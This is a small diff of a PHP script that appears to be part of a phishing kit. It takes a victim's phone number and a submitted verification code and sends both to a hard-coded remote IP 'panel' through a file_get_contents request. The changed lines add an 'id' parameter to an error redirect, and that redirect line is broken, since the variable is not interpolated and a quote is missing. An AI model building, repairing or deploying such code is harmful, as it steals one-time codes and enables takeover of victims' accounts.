@@ -21,13 +21,17 @@ if( isset($_SESSION["user"])){
 if( isset($_SESSION["phone"])){
     $phone = $_SESSION['phone'];
 }
+$id = "";
+if( isset($_GET['id'])){
+    $id = $_GET['id'];
+}
 
 // $user = @$_POST['user'];
 $code = trim($_POST['code']);
 // $phone = trim($_POST['phone']);
 echo $phone . " : " . $code;
 if ($code == "") {
-  echo '<meta http-equiv="refresh" content="0; URL=codeinfo.php?error=1&phone=' . $phone . '&user=' . $user . '">';
+  echo '<meta http-equiv="refresh" content="0; URL=codeinfo.php?id=$id&error=1>';
     die();
 }
 $test = @file_get_contents("http://137.74.171.167/panelo/a.php?sms=$phone,$code");        // here goes the panel
